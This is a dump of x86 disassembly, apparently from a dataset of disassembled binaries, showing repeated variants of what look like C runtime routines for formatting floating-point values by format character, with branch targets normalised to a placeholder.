push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b841
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4357f4
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
cmp al 0x47
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d85c
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d589
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x31 ] 0x73
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_423765
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
or [ esi + 0x20 ] 0x10
call sub_427f8f
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f2ce
test al al
jne r-xdata
mov eax [ esi + 0x28 ]
test eax eax
jns r-xdata
inc al
jmp r-xdata
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x61
je r-xdata
mov eax [ esi + 0x28 ]
push ebx
push edi
mov ebx 0x15d
lea edi [ esi + 0x40 ]
add eax ebx
mov ecx edi
push eax
call sub_418fb7
test al al
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp al 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_418f85
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp al 0x47
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
mov ecx esi
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_41a839
test al al
je r-xdata
mov eax edi
pop edi
pop ebx
mov ecx edi
call sub_418f85
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
push [ esi + 0x8 ]
movsx eax [ esi + 0x31 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b841
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4357f4
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
test al 0x1
je r-xdata
mov ebx edi
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
cmp al 0x47
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d85c
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d589
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x31 ] 0x73
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
mov [ esi + 0x38 ] edx
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_4238de
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
test eax eax
jns r-xdata
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_418fb7
test al al
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp al 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_418f85
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp al 0x47
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_418f85
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x31 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b841
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4357f4
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
cmp al 0x47
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d85c
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d589
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x31 ] 0x73
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_423a38
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
test eax eax
jns r-xdata
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_418fb7
test al al
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp al 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_418f85
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp al 0x47
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_418f85
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x31 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b841
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4357f4
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
cmp al 0x47
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d85c
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d589
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x31 ] 0x73
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_423b92
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
or [ esi + 0x20 ] 0x10
call sub_427fe2
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f2e4
test al al
jne r-xdata
mov eax [ esi + 0x28 ]
test eax eax
jns r-xdata
inc al
jmp r-xdata
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x61
je r-xdata
mov eax [ esi + 0x28 ]
push ebx
push edi
mov ebx 0x15d
lea edi [ esi + 0x40 ]
add eax ebx
mov ecx edi
push eax
call sub_418fb7
test al al
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp al 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_418f85
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp al 0x47
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
mov ecx esi
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_41a8c7
test al al
je r-xdata
mov eax edi
pop edi
pop ebx
mov ecx edi
call sub_418f85
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
push [ esi + 0x8 ]
movsx eax [ esi + 0x31 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b841
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4357f4
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
test al 0x1
je r-xdata
mov ebx edi
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
cmp al 0x47
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d85c
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d589
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x31 ] 0x73
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
mov [ esi + 0x38 ] edx
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_423d0b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
push edi
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
test eax eax
jns r-xdata
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_418fb7
test al al
jne r-xdata
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp al 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_418f85
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp al 0x47
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_418f85
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x31 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b841
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4357f4
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
mov al [ esi + 0x31 ]
cmp al 0x67
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
cmp al 0x47
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d85c
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d589
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
mov [ esi + 0x31 ] 0x73
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_423e65
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov esi ecx
push 0x67
pop ecx
push 0x47
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
pop edx
test eax eax
jns r-xdata
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp eax 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_418fb7
test al al
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp ax cx
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp eax 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_418f85
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp ax dx
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_418f85
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x32 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b841
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4357f4
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
movzx eax [ esi + 0x32 ]
push 0x67
pop ecx
cmp ax cx
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
push 0x47
pop ecx
cmp ax cx
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d85c
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d589
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
push 0x73
pop eax
mov [ esi + 0x32 ] ax
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_423fd7
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
or [ esi + 0x20 ] 0x10
call sub_428035
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f2fa
test al al
jne r-xdata
mov eax [ esi + 0x28 ]
push 0x67
pop ecx
push 0x47
pop edx
test eax eax
jns r-xdata
inc al
jmp r-xdata
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp eax 0x61
je r-xdata
mov eax [ esi + 0x28 ]
push ebx
push edi
mov ebx 0x15d
lea edi [ esi + 0x40 ]
add eax ebx
mov ecx edi
push eax
call sub_418fb7
test al al
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp ax cx
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp eax 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_418f85
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp ax dx
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
mov ecx esi
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_41a955
test al al
je r-xdata
mov eax edi
pop edi
pop ebx
mov ecx edi
call sub_418f85
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
push [ esi + 0x8 ]
movsx eax [ esi + 0x32 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b841
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4357f4
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
test al 0x1
je r-xdata
mov ebx edi
movzx eax [ esi + 0x32 ]
push 0x67
pop ecx
cmp ax cx
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
push 0x47
pop ecx
cmp ax cx
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d85c
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d589
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
push 0x73
pop eax
mov [ esi + 0x32 ] ax
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
mov [ esi + 0x38 ] edx
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_424168
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov esi ecx
push 0x67
pop ecx
push 0x47
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
pop edx
test eax eax
jns r-xdata
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp eax 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_418fb7
test al al
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp ax cx
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp eax 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_418f85
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp ax dx
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_418f85
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x32 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b841
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4357f4
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
movzx eax [ esi + 0x32 ]
push 0x67
pop ecx
cmp ax cx
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
push 0x47
pop ecx
cmp ax cx
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d85c
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d589
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
push 0x73
pop eax
mov [ esi + 0x32 ] ax
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_4242da
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
mov esi ecx
push 0x67
pop ecx
push 0x47
or [ esi + 0x20 ] 0x10
mov eax [ esi + 0x28 ]
pop edx
test eax eax
jns r-xdata
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp eax 0x61
je r-xdata
mov eax [ esi + 0x28 ]
lea edi [ esi + 0x40 ]
push ebx
mov ebx 0x15d
mov ecx edi
add eax ebx
push eax
call sub_418fb7
test al al
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp ax cx
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp eax 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_418f85
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp ax dx
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
add [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x14 ]
mov eax [ ecx - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ecx - 0x4 ]
mov ecx edi
mov [ ebp - 0x4 ] eax
call sub_418f85
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
mov eax edi
push [ esi + 0x8 ]
movsx eax [ esi + 0x32 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b841
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4357f4
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
pop ebx
test al 0x1
je r-xdata
mov ebx edi
movzx eax [ esi + 0x32 ]
push 0x67
pop ecx
cmp ax cx
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
push 0x47
pop ecx
cmp ax cx
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d85c
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d589
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
push 0x73
pop eax
mov [ esi + 0x32 ] ax
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
pop edi
mov [ esi + 0x38 ] edx
pop esi
mov esp ebp
pop ebp
retn
cmp al 0x6e
je r-xdata
cmp al 0x4e
jne r-xdata
lea edi [ edx + 0x1 ]
sub_42444c
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
or [ esi + 0x20 ] 0x10
call sub_428088
test al al
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_41f310
test al al
jne r-xdata
mov eax [ esi + 0x28 ]
push 0x67
pop ecx
push 0x47
pop edx
test eax eax
jns r-xdata
inc al
jmp r-xdata
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp eax 0x61
je r-xdata
mov eax [ esi + 0x28 ]
push ebx
push edi
mov ebx 0x15d
lea edi [ esi + 0x40 ]
add eax ebx
mov ecx edi
push eax
call sub_418fb7
test al al
jne r-xdata
movzx eax [ esi + 0x32 ]
cmp ax cx
je r-xdata
mov [ esi + 0x28 ] 0xd
jmp r-xdata
cmp eax 0x41
je r-xdata
mov eax [ edi + 0x404 ]
test eax eax
jne r-xdata
mov ecx edi
call sub_418f85
sub eax ebx
mov [ esi + 0x28 ] eax
mov [ esi + 0x28 ] 0x1
cmp ax dx
jne r-xdata
mov [ esi + 0x28 ] 0x6
jmp r-xdata
and [ ebp - 0x8 ] 0x0
mov ecx esi
and [ ebp - 0x4 ] 0x0
mov [ esi + 0x34 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_41a9e3
test al al
je r-xdata
mov eax edi
pop edi
pop ebx
mov ecx edi
call sub_418f85
mov ebx [ edi + 0x404 ]
mov ecx eax
test ebx ebx
jne r-xdata
push [ esi + 0x8 ]
movsx eax [ esi + 0x32 ]
push [ esi + 0x4 ]
push [ esi ]
push [ esi + 0x28 ]
push eax
push ecx
mov ecx edi
call sub_41b841
push eax
mov ecx edi
call sub_418f85
push eax
lea eax [ ebp - 0x8 ]
push ebx
push eax
call sub_4357f4
mov eax [ esi + 0x20 ]
add esp 0x28
shr eax 0x5
test al 0x1
je r-xdata
mov ebx edi
movzx eax [ esi + 0x32 ]
push 0x67
pop ecx
cmp ax cx
je r-xdata
cmp [ esi + 0x28 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
shr eax 0x5
test al 0x1
jne r-xdata
push 0x47
pop ecx
cmp ax cx
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d85c
pop ecx
pop ecx
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x2d
jne r-xdata
push [ esi + 0x8 ]
push [ esi + 0x34 ]
call sub_41d589
pop ecx
pop ecx
mov edx [ esi + 0x34 ]
mov al [ edx ]
cmp al 0x69
je r-xdata
or [ esi + 0x20 ] 0x40
inc eax
mov [ esi + 0x34 ] eax
push 0x73
pop eax
mov [ esi + 0x32 ] ax
cmp al 0x49
je r-xdata
mov cl [ edx ]
inc edx
test cl cl
jne r-xdata
sub edx edi
mov al 0x1
mov [ esi + 0x38 ] edx
cmp al 0x6e
je r-xdata
cmp al 0x4e
